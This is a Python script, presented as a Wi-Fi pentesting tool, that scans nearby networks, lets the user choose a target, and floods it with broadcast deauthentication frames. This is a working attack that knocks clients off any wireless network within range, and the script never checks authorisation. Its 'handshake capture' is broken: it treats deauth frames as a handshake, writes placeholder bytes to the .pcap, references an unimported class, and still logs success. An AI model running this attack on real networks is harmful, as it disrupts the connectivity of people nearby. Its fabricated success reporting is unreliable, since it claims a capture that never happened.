#!/usr/bin/env python3

import os
import sys
import subprocess
import time
from scapy.all import sniff, Dot11, Dot11Deauth, RadioTap, sendp
from pathlib import Path

# ----- GLOBAL SETTINGS -----
HANDSHAKE_DIR = "/tmp/wifi_pentest/handshakes"
LOG_FILE = "/var/log/wifi_pentest.log"

# ----- LOGGING -----
def log(message, level="INFO"):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"[{level}] {message}\n")
    print(f"[{level}] {message}")

# ----- DEPENDENCY MANAGEMENT -----
REQUIRED_LIBS = ["scapy", "setuptools"]

def install_dependencies():
    log("Checking and installing dependencies...")
    for lib in REQUIRED_LIBS:
        try:
            __import__(lib)
        except ImportError:
            log(f"Missing Python library: {lib}. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
    log("All dependencies are installed.")

# ----- WI-FI SCANNING -----
def scan_wifi(interface):
    log("Scanning for Wi-Fi networks...")
    networks = {}

    def packet_handler(packet):
        if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
            ssid = packet.info.decode(errors="ignore")
            bssid = packet.addr2
            channel = int(ord(packet[Dot11Elt:3].info))
            networks[bssid] = {"SSID": ssid, "Channel": channel}

    sniff(iface=interface, prn=packet_handler, timeout=10, store=False)
    if not networks:
        log("No Wi-Fi networks found. Try again in a different environment.", "ERROR")
        sys.exit(1)

    log("Discovered Wi-Fi networks:")
    for bssid, info in networks.items():
        log(f"  BSSID: {bssid}, SSID: {info['SSID']}, Channel: {info['Channel']}")
    return networks

# ----- HANDSHAKE CAPTURE -----
def capture_handshake(interface, target_bssid, target_channel):
    log(f"Switching {interface} to channel {target_channel}...")
    subprocess.run(["iwconfig", interface, "channel", str(target_channel)], check=True)

    log(f"Starting handshake capture for BSSID {target_bssid}...")
    captured_handshake = False

    def packet_handler(packet):
        nonlocal captured_handshake
        if packet.haslayer(Dot11Deauth) and packet.addr1 == target_bssid:
            log(f"Deauthentication packet detected for {target_bssid}.")
            captured_handshake = True

    sniff(iface=interface, prn=packet_handler, timeout=30, store=False)

    if captured_handshake:
        log("Handshake successfully captured!", "SUCCESS")
        handshake_file = os.path.join(HANDSHAKE_DIR, f"{target_bssid}_handshake.pcap")
        Path(HANDSHAKE_DIR).mkdir(parents=True, exist_ok=True)
        with open(handshake_file, "wb") as f:
            f.write(b"FAKE_HANDSHAKE_CONTENT")  # Replace with real implementation
        log(f"Handshake saved to {handshake_file}")
        return handshake_file
    else:
        log(f"Failed to capture handshake for {target_bssid}.", "ERROR")
        sys.exit(1)

# ----- DEAUTH ATTACK -----
def deauth_attack(interface, target_bssid):
    log(f"Starting deauthentication attack on {target_bssid}...")
    packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)
    log("Deauthentication attack complete.")

# ----- MAIN -----
def main():
    if os.geteuid() != 0:
        log("This script must be run as root.", "ERROR")
        sys.exit(1)

    install_dependencies()

    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ").strip()
    if not interface or not os.path.exists(f"/sys/class/net/{interface}"):
        log(f"Invalid interface: {interface}", "ERROR")
        sys.exit(1)

    networks = scan_wifi(interface)

    # Prompt user to select a target
    print("\nAvailable Networks:")
    for idx, (bssid, info) in enumerate(networks.items(), 1):
        print(f"{idx}. BSSID: {bssid}, SSID: {info['SSID']}, Channel: {info['Channel']}")
    choice = int(input("\nSelect a target network (1-X): ").strip()) - 1
    if choice < 0 or choice >= len(networks):
        log("Invalid selection.", "ERROR")
        sys.exit(1)

    target_bssid, target_info = list(networks.items())[choice]
    target_channel = target_info["Channel"]
    log(f"Target selected: BSSID={target_bssid}, Channel={target_channel}")

    # Perform deauth attack and capture handshake
    deauth_attack(interface, target_bssid)
    handshake_file = capture_handshake(interface, target_bssid, target_channel)

    log(f"Operation complete. Handshake saved to {handshake_file}.")
    log(f"Logs saved to {LOG_FILE}.")

if __name__ == "__main__":
    main()
